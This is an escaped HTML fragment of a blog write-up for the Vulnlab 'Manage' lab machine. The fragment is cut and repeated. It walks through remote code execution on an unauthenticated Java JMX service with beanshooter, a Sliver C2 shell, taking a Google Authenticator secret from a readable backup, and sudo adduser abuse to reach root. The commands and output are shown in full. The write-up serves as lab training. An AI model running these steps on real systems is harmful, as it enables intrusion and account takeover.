-Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class=\"line\">[+] Creating a TemplateImpl payload object to abuse StandardMBean</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]     Deplyoing MBean: StandardMBean</span><br><span class=\"line\">[+]     MBean with object name de.qtc.beanshooter:standard=5272461178416 was successfully deployed.</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, an MBean object that abuses the <code>StandardMBean</code> method was deployed on the target webserver. We can call this tonka object by calling it directly from our client-side session to create a command-line session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.10.89.27 2222 </span><br><span class=\"line\">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class=\"line\">[tomcat@10.10.89.27 /]$ whoami</span><br><span class=\"line\">tomcat</span><br><span class=\"line\">[tomcat@10.10.89.27 /]$ </span><br></pre></td></tr></table></figure>\n\n<p>As you can see, a command-line session was generated as the <code>tomcat</code> user. I stood up a Sliver C2 session at this point, just to get a proper shell since I noticed I couldn’t execute some commands (that you’ll see us do later) for basic Bash usage, like <code>su</code> or <code>sudo</code>.</p>\n<p><img src=\"/images/vulnlab/manage-vl/c.png\"></p>\n<h1 id=\"Pivoting-via-Google-Authenticator\"><a href=\"#Pivoting-via-Google-Authenticator\" class=\"headerlink\" title=\"Pivoting via Google Authenticator\"></a>Pivoting via Google Authenticator</h1><p>Doing a bit of a enumeration onto the internal filesystem seems to show us that there are two users in the <code>/home</code> directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@manage:/tmp$ ls /home</span><br><span class=\"line\">karl  useradmin</span><br><span class=\"line\">tomcat@manage:/tmp$ ls -la /home</span><br><span class=\"line\">total 16</span><br><span class=\"line\">drwxr-xr-x  4 root      root      4096 Jun 21 15:46 .</span><br><span class=\"line\">drwxr-xr-x 19 root      root      4096 Mar  1 04:20 ..</span><br><span class=\"line\">drwxr-xr-x  3 karl      karl      4096 Jun 21 16:51 karl</span><br><span class=\"line\">drwxr-xr-x  5 useradmin useradmin 4096 Jun 21 16:51 useradmin</span><br></pre></td></tr></table></figure>\n\n<p>Given that we have two usernames and passwords from our enumeration of the JMX environment earlier, I decided to see if either of these users had the same password associated with their account. While I didn’t get a direct match immediately, I did notice that a new prompt appeared for the local <code>useradmin</code> user when entering in the JMX <code>admin</code> user’s password from before.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+]             Username:  admin</span><br><span class=\"line\">[+]             Password:  [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/manage-vl/d.png\"></p>\n<p>It seems that the <code>useradmin</code>‘s password is the same as the <code>admin</code> user that we saw from before. It didn’t give us an authentication error message and instead prompted us to enter in a verification code.</p>\n<p>I’ve tested using Linux authentication tied to secondary authentication&#x2F;MFA, so I know there must be some form of authentication tied to the <code>useradmin</code>‘s user. I’m more familiar with using Google authenticator for this, so I decided to do a recursive search for any Google authenticator files on the filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@manage:/tmp$ find / -name *google* 2&gt;/dev/null</span><br><span class=\"line\">......</span><br><span class=\"line\">/home/useradmin/.google_authenticator</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>I found an odd file denoted as <code>.google_authenticator</code> within the home directory for <code>useradmin</code>. I wouldn’t expect for us to be able to access this, however I noticed that <code>useradmin</code> did not have restricted access for the everyone group on the filesystem - meaning we could access their home directory.</p>\n<p>Upon trying to access their file, we can see that we don’t have access to it. We do however have read access to the <code>backups</code> directory within their home folder.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@manage:/home/useradmin/backups$ ls -la</span><br><span class=\"line\">total 12</span><br><span class=\"line\">drwxrwxr-x 2 useradmin useradmin 4096 Jun 21 16:51 .</span><br><span class=\"line\">drwxr-xr-x 5 useradmin useradmin 4096 Jul  3 22:59 ..</span><br><span class=\"line\">-rw-rw-r-- 1 useradmin useradmin 3088 Jun 21 16:50 backup.tar.gz</span><br></pre></td></tr></table></figure>\n\n<p>It seems that a tar&#x2F;gzip archive exists in this backups directory. I pulled this to my local machine by downloading it through Sliver, and unzipped the archive to see its contents.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ tar -xzf backup.tar.gz </span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ls -la          </span><br><span class=\"line\">total 36</span><br><span class=\"line\">drwxr-xr-x 4 daz daz 4096 Jun 21 12:48 .</span><br><span class=\"line\">drwxr-xr-x 8 daz daz 4096 Jul  3 16:17 ..</span><br><span class=\"line\">lrwxrwxrwx 1 daz daz    9 Jun 21 11:48 .bash_history -&gt; /dev/null</span><br><span class=\"line\">-rw-r--r-- 1 daz daz  220 Jun 21 11:46 .bash_logout</span><br><span class=\"line\">-rw-r--r-- 1 daz daz 3771 Jun 21 11:46 .bashrc</span><br><span class=\"line\">drwx------ 2 daz daz 4096 Jun 21 12:48 .cache</span><br><span class=\"line\">-r-------- 1 daz daz  200 Jun 21 12:48 .google_authenticator</span><br><span class=\"line\">-rw-r--r-- 1 daz daz  807 Jun 21 11:46 .profile</span><br><span class=\"line\">drwxrwxr-x 2 daz daz 4096 Jun 21 11:53 .ssh</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz 3088 Jul  3 19:08 backup.tar.gz</span><br></pre></td></tr></table></figure>\n\n<p>It seems that a similar <code>.google_authenticator</code> file was decompressed from the archive. If we read this file, we can see that there are a plethora of verification codes that are within this file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat .google_authenticator </span><br><span class=\"line\">CLSSSMHYGLENX5HAIFBQ6L35UM</span><br><span class=\"line\">&quot; RATE_LIMIT 3 30 1718988529</span><br><span class=\"line\">&quot; WINDOW_SIZE 3</span><br><span class=\"line\">&quot; DISALLOW_REUSE 57299617</span><br><span class=\"line\">&quot; TOTP_AUTH</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Based on the <code>RATE_LIMIT</code>, my guess is that we can only use these backup verification codes three times every 30 minutes or they refresh every 30 minutes.</p>\n<p>If we attempt to log in as <code>useradmin</code> with their password and one of these verification codes (I used 99852083), we can see that the codes seem to work and we are able to login as <code>useradmin</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@manage:/home/useradmin/backups$ su useradmin</span><br><span class=\"line\">Password: </span><br><span class=\"line\">Verification code: </span><br><span class=\"line\">useradmin@manage:~/backups$</span><br></pre></td></tr></table></figure>\n\n<p>I made sure to execute my Sliver binary again so we aren’t required to use another token for a login attempt.</p>\n<h1 id=\"Privilege-Escalation-via-Admin-Group\"><a href=\"#Privilege-Escalation-via-Admin-Group\" class=\"headerlink\" title=\"Privilege Escalation via Admin Group\"></a>Privilege Escalation via Admin Group</h1><p>Upon getting access to <code>useradmin</code>, I immediately ran <code>sudo -l</code> to see if we had sudo access to any binaries on the filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@manage:/home/useradmin/backups$ su useradmin</span><br><span class=\"line\">Password: </span><br><span class=\"line\">Verification code: </span><br><span class=\"line\">useradmin@manage:~/backups$ sudo -l</span><br><span class=\"line\">Matching Defaults entries for useradmin on manage:</span><br><span class=\"line\">    env_reset, timestamp_timeout=1440, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,</span><br><span class=\"line\">    use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User useradmin may run the following commands on manage:</span><br><span class=\"line\">    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$</span><br></pre></td></tr></table></figure>\n\n<p>We seem to have sudo access to <code>/usr/sbin/adduser</code>, though you’ll notice that a string of text is following the command.</p>\n<p>I did some research into specifically what this meant, and it seems to be a string of characters followed by regular expression variables that limit the extent of the command.</p>\n<ul>\n<li><code>^</code> indicates that the start of a line.</li>\n<li><code>[a-zA-Z0-9]</code> indicates any set of alphanumeric characters.</li>\n<li><code>+</code> means that we can add an unlimited amount of characters, given that they fall under the prerequisites of the previous regex statement (alphanumeric).</li>\n<li><code>$</code> indicates the end of the line.</li>\n</ul>\n<p>This essentially means that we only have the ability to enter in a string for <code>adduser</code>, limiting what we essentially are able to do.</p>\n<p>The <code>/usr/sbin/adduser</code> binary seems to just be adding a user. The interesting part is that a <code>--system</code> function exists in that binary which seems to allow us to add a system privileged (root-level) user. The only issue is the regular expression privileges that I described earlier, which limit us from adding anything else besides an alphanumeric string as an argument in the command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">useradmin@manage:~/backups$ sudo /usr/sbin/adduser daz --system</span><br><span class=\"line\">[sudo] password for useradmin:                                                                                                </span><br><span class=\"line\">sudo: a password is required                                                                                                  </span><br><span class=\"line\">useradmin@manage:~/backups$ sudo /usr/sbin/adduser daz                </span><br><span class=\"line\">Adding user `daz&#x27; ...                        </span><br><span class=\"line\">Adding new group `daz&#x27; (1003) ...</span><br><span class=\"line\">Adding new user `daz&#x27; (1003) with group `daz&#x27; ...</span><br><span class=\"line\">Creating home directory `/home/daz&#x27; ...</span><br><span class=\"line\">Copying files from `/etc/skel&#x27; ...</span><br><span class=\"line\">New password: </span><br></pre></td></tr></table></figure>\n\n<p>If the binary ends up requiring us to enter in the <code>useradmin</code> password, this means that our string was not accepted and it WILL error out if you authenticate normally. We have <code>NOPASSWD</code> privileges for this binary, meaning it should work normally without a password if we use the command as intended.</p>\n<p>My first thought when doing this was to see if there were any ways to exploit how Linux interprets regular expressions with their commands. I was able to trigger regex when attempting to use bash-specific characters like <code>!</code> and <code>\\</code>:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">useradmin@manage:~/backups$ sudo /usr/sbin/adduser daz!a       </span><br><span class=\"line\">bash: !a: event not found</span><br></pre></td></tr></table></figure>\n\n<p>Though I wasn’t able to get anywhere with it. I did however, find a solution when considering a specific user we could add while staying in the bounds of what the <code>adduser</code> binary can actually do.</p>\n<p>If you try to add a user called <code>root</code>, it should produce an error that the <code>root</code> user already exists - because it does. However, if you look at the default <code>/etc/sudoers</code> <a href=\"https://gist.github.com/alitoufighi/679304d9585304075ba1ad93f80cce0e\">file on Ubuntu machines</a>, you may find an interesting parameter that is there by default.</p>\n<p><img src=\"/images/vulnlab/manage-vl/e.png\"></p>\n<p>It seems that users within the <code>admin</code> group also have all sudo privileges, much like the root user. </p>\n<p>However if you’ll notice, there is no <code>admin</code> group within <code>/etc/group</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">......</span><br><span class=\"line\">landscape:x:117:</span><br><span class=\"line\">fwupd-refresh:x:118:</span><br><span class=\"line\">karl:x:1000:</span><br><span class=\"line\">tomcat:x:1001:</span><br><span class=\"line\">useradmin:x:1002:</span><br><span class=\"line\">daz:x:1003:</span><br></pre></td></tr></table></figure>\n\n<p>This means that if we create a user named <code>admin</code>, it should be granted SUDO rights on the machine based on the <code>sudoers</code> file. Since there isn’t a user&#x2F;group already created, it will interpret the user’s name as the group for it to add to. This is backed by the fact that our users are given a group of their same name if we run <code>cat /etc/group</code>, as listed above.</p>\n<p>So if we create a user called admin, it should trick the Linux OS into creating an <code>admin</code> group which will give all users (one of which being our newly created user) SUDO rights on the filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">useradmin@manage:~/backups$ sudo /usr/sbin/adduser admin</span><br><span class=\"line\">Adding user `admin&#x27; ...</span><br><span class=\"line\">Adding new group `admin&#x27; (1004) ...</span><br><span class=\"line\">Adding new user `admin&#x27; (1004) with group `admin&#x27; ...</span><br><span class=\"line\">Creating home directory `/home/admin&#x27; ...</span><br><span class=\"line\">Copying files from `/etc/skel&#x27; ...</span><br><span class=\"line\">New password: </span><br><span class=\"line\">Retype new password: </span><br><span class=\"line\">passwd: password updated successfully</span><br><span class=\"line\">Changing the user information for admin</span><br><span class=\"line\">Enter the new value, or press ENTER for the default</span><br><span class=\"line\">        Full Name []: </span><br><span class=\"line\">        Room Number []: </span><br><span class=\"line\">        Work Phone []: </span><br><span class=\"line\">        Home Phone []: </span><br><span class=\"line\">        Other []: </span><br><span class=\"line\">Is the information correct? [Y/n] Y</span><br></pre></td></tr></table></figure>\n\n<p>I gave the <code>admin</code> user the password <code>password</code>, and if we attempt to use <code>sudo su</code>:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">useradmin@manage:~/backups$ su admin</span><br><span class=\"line\">Password: </span><br><span class=\"line\">To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span><br><span class=\"line\">See &quot;man sudo_root&quot; for details.</span><br><span class=\"line\"></span><br><span class=\"line\">admin@manage:/home/useradmin/backups$ sudo su</span><br><span class=\"line\">[sudo] password for admin: </span><br><span class=\"line\">root@manage:/home/useradmin/backups# whoami</span><br><span class=\"line\">root</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were successfully able to login as <code>root</code>. The root flag is within <code>/root/root.txt</code>, and this means we have successfully compromised this machine!</p>\n<p><img src=\"/images/vulnlab/manage-vl/f.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This box really helped with problem-solving and understanding how to properly exploit something if you just consider exactly how it’s supposed to function. Don’t get wrapped up into a rabbit hole by overthinking what you can exploit - instead take some time to think about the overarching functionality that something can do while also staying within the boundaries of its limits.</p>\n<p>Great machine, big thanks again to fume and xct.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html\">https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html</a><br><a href=\"https://www.geeksforgeeks.org/remote-method-invocation-in-java/\">https://www.geeksforgeeks.org/remote-method-invocation-in-java/</a><br><a href=\"https://www.baeldung.com/java-management-extensions\">https://www.baeldung.com/java-management-extensions</a><br><a href=\"https://docs.oracle.com/javase%2Ftutorial%2F/jmx/mbeans/index.html#:~:text=An%20MBean%20is%20a%20managed,that%20needs%20to%20be%20managed\">https://docs.oracle.com/javase%2Ftutorial%2F/jmx/mbeans/index.html#:~:text=An%20MBean%20is%20a%20managed,that%20needs%20to%20be%20managed</a>.<br><a href=\"https://gist.github.com/alitoufighi/679304d9585304075ba1ad93f80cce0e\">https://gist.github.com/alitoufighi/679304d9585304075ba1ad93f80cce0e</a><br><a href=\"https://kodekloud.com/blog/how-to-list-all-groups-in-linux/\">https://kodekloud.com/blog/how-to-list-all-groups-in-linux/</a></p>\n","cover_type":"img","excerpt":"","more":"<p>Manage is one of the latest machines created by fume and xct, and it involves enumerating and exploiting a Java MBeans application that is tied to Apache Tomcat. Privilege escalation then involves general binary exploitation with sudo privileges.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 16:19 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.89.27</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 997 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">2222/tcp open  EtherNetIP-1</span><br><span class=\"line\">8080/tcp open  http-proxy</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 4.00 seconds</span><br></pre></td></tr></table></figure>\n\n<p>As we can see, it seems as though there are three ports open - SSH, a web-server behind a proxy, and finally a new service that I haven’t seen before on port 8080.</p>\n<p>Assuming that we don’t have access to SSH immediately, I went to the web server on port 8080 to see if there was anything we could access.</p>\n<p><img src=\"/images/vulnlab/manage-vl/b.png\"></p>\n<p>It seems to be a relatively generic Apache Tomcat server, with the specific version of Tomcat being 10.1.19. </p>\n<p>I researched a bit into the Tomcat version, and there doesn’t seem to be much to exploit for this specific instance. I also made sure to enumerate the directories, however there doesn’t seem to be much that we can access from this specific web server.</p>\n<h1 id=\"Java-RMI-RMX\"><a href=\"#Java-RMI-RMX\" class=\"headerlink\" title=\"Java RMI&#x2F;RMX\"></a>Java RMI&#x2F;RMX</h1><p>This lead me to research into what the third port that we have, port 2222. I found that doing a bit of continued enumeration with NMAP allowed us to discover the actual service on this port.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap -A -p2222 10.10.89.27</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 16:36 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.89.27</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE SERVICE  VERSION</span><br><span class=\"line\">2222/tcp open  java-rmi Java RMI</span><br><span class=\"line\">| rmi-dumpregistry: </span><br><span class=\"line\">|   jmxrmi</span><br><span class=\"line\">|     javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class=\"line\">|     @127.0.1.1:32877</span><br><span class=\"line\">|     extends</span><br><span class=\"line\">|       java.rmi.server.RemoteStub</span><br><span class=\"line\">|       extends</span><br><span class=\"line\">|_        java.rmi.server.RemoteObject</span><br><span class=\"line\">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>\n\n<p>The service seems to be <a href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html\">Java RMI</a>, the Java Remote Method Invocation API. This API allows the developer to create Java-based technology and connect it with Java-based applications. This allows the developer to invoke Java objects on other Java machines within the application environment, and also serialize user objects by supporting object-oriented polymorphism.</p>\n<p>In much simpler terms, this allows developers to invoke a pre-created Java method onto an object that is from another address space. This space can live on either the same machine or another machine that has access to the RMI space.</p>\n<p>Remote machines can invoke methods on a the JVM (Java Virtual Machine) whether that be on the same machine (client-side) or on another machine as described previously (sever-side). RMI will automatically create a public server so that these client and server-side communications can be invoked with simple method calls.</p>\n<p>You’ll also notice that there seems to be a JMX instance tied to this RMI functionality. JMX is the Java Management Extensions framework that allows for easy and reliable configuration of a Java application whether that be remotely or locally. This introduces the concept of MBeans, which is a managed java object that follows patterns set by the JMX application.</p>\n<p>A JMX architecture can consist of the following (credit goes to <a href=\"https://www.baeldung.com/java-management-extensions\">Baeldung</a>):</p>\n<ol>\n<li><strong>Instrumentation Layer:</strong> MBeans registered with the JMX agent through which resources are managed.</li>\n<li><strong>JMX Agent Layer:</strong> the core component (MBeanServer) which maintains registry of managed MBeans and provides an interface to access them.</li>\n<li><strong>Remote Management Layer:</strong> usually client side tool like JConsole.</li>\n</ol>\n<p>Wrapping this all together, a developer can manage MBeans objects within a JMX application and integrate them into a JMI application through either client or server-side communication integration.</p>\n<p>Since this allows for a client on a remote virtual machine to interact with the JMI&#x2F;JMX instance, we have the potential to exploit this for either enumeration or remote code execution.</p>\n<h1 id=\"Attacking-JMX-with-Beanshooter\"><a href=\"#Attacking-JMX-with-Beanshooter\" class=\"headerlink\" title=\"Attacking JMX with Beanshooter\"></a>Attacking JMX with Beanshooter</h1><p>Since I’m not the most prominent Java developer in the slightest, I decided to do some research on JMX tools online that could do enumeration for us. After a bit of time, I came across <a href=\"https://github.com/qtc-de/beanshooter\">beanshooter</a> by qtc.</p>\n<p>Beanshooter is an RMX enumeration and attacking tool that helps identify vulnerabilities in JMX applications. With this tool, we can enumerate the JMX environment by utilizing Java object invocation on certain methods in the application.</p>\n<p>The GitHub repository listed has the basic installation for the utility, though you’ll need to make sure you have both Maven and a linked JDK installation. Your java version that is installed by default should already link itself to maven automatically, though this <a href=\"https://www.digitalocean.com/community/tutorials/install-maven-linux-ubuntu\">resource</a> seemed to help me when I was troubleshooting initially.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ mvn --version</span><br><span class=\"line\">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class=\"line\">Apache Maven 3.8.7</span><br><span class=\"line\">Maven home: /usr/share/maven</span><br><span class=\"line\">Java version: 17.0.11, vendor: Debian, runtime: /usr/lib/jvm/java-17-openjdk-amd64</span><br><span class=\"line\">Default locale: en, platform encoding: UTF-8</span><br></pre></td></tr></table></figure>\n\n<p>You can then compile the beanshooter repository by executing <code>mvn package</code> within the root directory of the GitHub repo. </p>\n<p>This should build the Java binary within <code>/target</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">-rw-rw-r--  1 daz daz 4584431 Jul  2 16:57 beanshooter-4.1.0-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure>\n\n<p>You can then execute this binary by running it against the <code>java</code> command-line tool.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar -h                          </span><br><span class=\"line\">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class=\"line\">usage: beanshooter [-h]   ...</span><br><span class=\"line\"></span><br><span class=\"line\">beanshooter v4.1.0 - a JMX enumeration and attacking tool</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the utility downloaded, let’s enumerate the target environment. You can do so by using the <code>enum</code> argument parameter which will enumerate the target server for common JMX vulnerabilities. There aren’t any positional arguments that we need aside from the host and port of the target server.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.89.27 2222</span><br><span class=\"line\">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class=\"line\">[+] Checking available bound names:</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]     * jmxrmi (JMX endpoint: 127.0.1.1:32877)</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+] Checking for unauthorized access:</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]     - Remote MBean server does not require authentication.</span><br><span class=\"line\">[+]       Vulnerability Status: Vulnerable</span><br><span class=\"line\">......</span><br><span class=\"line\">[+] Enumerating tomcat users:</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]     - Listing 2 tomcat users:</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]             ----------------------------------------</span><br><span class=\"line\">[+]             Username:  manager</span><br><span class=\"line\">[+]             Password:  [...snip...]</span><br><span class=\"line\">[+]             Roles:</span><br><span class=\"line\">[+]                        Users:type=Role,rolename=&quot;manage-gui&quot;,database=UserDatabase</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]             ----------------------------------------</span><br><span class=\"line\">[+]             Username:  admin</span><br><span class=\"line\">[+]             Password:  [...snip...]</span><br><span class=\"line\">[+]             Roles:</span><br><span class=\"line\">[+]                        Users:type=Role,rolename=&quot;role1&quot;,database=UserDatabase</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the enumeration functionality was able to verify a common vulnerability within this specific JMX server. It seems as though in our scenario, the JMX service does not require authentication.</p>\n<p>It also was able to successfully enumerate two tomcat users, <code>manager</code> and <code>admin</code>, along with their plaintext passwords. Should we have needed to brute-force the application to check for weak passwords, we could use <code>beanshooter</code>‘s <code>brute</code> functionality.</p>\n<p>Now that we have credentials to the JMX application, we can simply call a standard shell invocation using <code>beanshooter</code>‘s <code>standard</code> functionality.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.89.27 2222 tonka</span><br><span class=\"line\">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class=\"line\">[+] Creating a TemplateImpl payload object to abuse StandardMBean</span><br><span class=\"line\">[+]</span><br><span class=\"line\">[+]     Deplyoing MBean: StandardMBean</span><br><span class=\"line\">[+]     MBean with object name de.qtc.beanshooter:standard=5272461178416 was successfully deployed.</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, an MBean object that abuses the <code>StandardMBean</code> method was deployed on the target webserver. We can call this tonka object by calling it directly from our client-side session to create a command-line session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.10.89.27 2222 </span><br><span class=\"line\">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class=\"line\">[tomcat@10.10.89.27 /]$ whoami</span><br><span class=\"line\">tomcat</span><br><span class=\"line\">[tomcat@10.10.89.27 /]$ </span><br></pre></td></tr></table></figure>\n\n<p>As you can see, a command-line session was generated as the <code>tomcat</code> user. I stood up a Sliver C2 session at this point, just to get a proper shell since I noticed I couldn’t execute some commands (that you’ll see us do later) for basic Bash usage, like <code>su</code> or <code>sudo</code>.</p>\n<p><img src=\"/images/vulnlab/manage-vl/c.png\"></p>\n<h1 id=\"Pivoting-via-Google-Authenticator\"><a href=\"#Pivoting-via-Google-Authenticator\" class=\"headerlink\" title=\"Pivoting via Google Authenticator\"></a>Pivoting via Google Authenticator</h1><p>Doing a bit of a enumeration onto the internal filesystem seems to show us that there are two users in the <code>/home</code> directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@manage:/tmp$ ls /home</span><br><span class=\"line\">karl  useradmin</span><br><span class=\"line\">tomcat@manage:/tmp$ ls -la /home</span><br><span class=\"line\">total 16</span><br><span class=\"line\">drwxr-xr-x  4 root      root      4096 Jun 21 15:46 .</span><br><span class=\"line\">drwxr-xr-x 19 root      root      4096 Mar  1 04:20 ..</span><br><span class=\"line\">drwxr-xr-x  3 karl      karl      4096 Jun 21 16:51 karl</span><br><span class=\"line\">drwxr-xr-x  5 useradmin useradmin 4096 Jun 21 16:51 useradmin</span><br></pre></td></tr></table></figure>\n\n<p>Given that we have two usernames and passwords from our enumeration of the JMX environment earlier, I decided to see if either of these users had the same password associated with their account. While I didn’t get a direct match immediately, I did notice that a new prompt appeared for the local <code>useradmin</code> user when entering in the JMX <code>admin</code> user’s password from before.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+]             Username:  admin</span><br><span class=\"line\">[+]             Password:  [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/manage-vl/d.png\"></p>\n<p>It seems that the <code>useradmin</code>‘s password is the same as the <code>admin</code> user that we saw from before. It didn’t give us an authentication error message and instead prompted us to enter in a verification code.</p>\n<p>I’ve tested using Linux authentication tied to secondary authentication&#x2F;MFA, so I know there must be some form of authentication tied to the <code>useradmin</code>‘s user. I’m more familiar with using Google authenticator for this, so I decided to do a recursive search for any Google authenticator files on the filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@manage:/tmp$ find / -name *google* 2&gt;/dev/null</span><br><span class=\"line\">......</span><br><span class=\"line\">/home/useradmin/.google_authenticator</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>I found an odd file denoted as <code>.google_authenticator</code> within the home directory for <code>useradmin</code>. I wouldn’t expect for us to be able to access this, however I noticed that <code>useradmin</code> did not have restricted access for the everyone group on the filesystem - meaning we could access their home directory.</p>\n<p>Upon trying to access their file, we can see that we don’t have access to it. We do however have read access to the <code>backups</code> directory within their home folder.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@manage:/home/useradmin/backups$ ls -la</span><br><span class=\"line\">total 12</span><br><span class=\"line\">drwxrwxr-x 2 useradmin useradmin 4096 Jun 21 16:51 .</span><br><span class=\"line\">drwxr-xr-x 5 useradmin useradmin 4096 Jul  3 22:59 ..</span><br><span class=\"line\">-rw-rw-r-- 1 useradmin useradmin 3088 Jun 21 16:50 backup.tar.gz</span><br></pre></td></tr></table></figure>\n\n<p>It seems that a tar&#x2F;gzip archive exists in this backups directory. I pulled this to my local machine by downloading it through Sliver, and unzipped the archive to see its contents.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ tar -xzf backup.tar.gz </span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ls -la          </span><br><span class=\"line\">total 36</span><br><span class=\"line\">drwxr-xr-x 4 daz daz 4096 Jun 21 12:48 .</span><br><span class=\"line\">drwxr-xr-x 8 daz daz 4096 Jul  3 16:17 ..</span><br><span class=\"line\">lrwxrwxrwx 1 daz daz    9 Jun 21 11:48 .bash_history -&gt; /dev/null</span><br><span class=\"line\">-rw-r--r-- 1 daz daz  220 Jun 21 11:46 .bash_logout</span><br><span class=\"line\">-rw-r--r-- 1 daz daz 3771 Jun 21 11:46 .bashrc</span><br><span class=\"line\">drwx------ 2 daz daz 4096 Jun 21 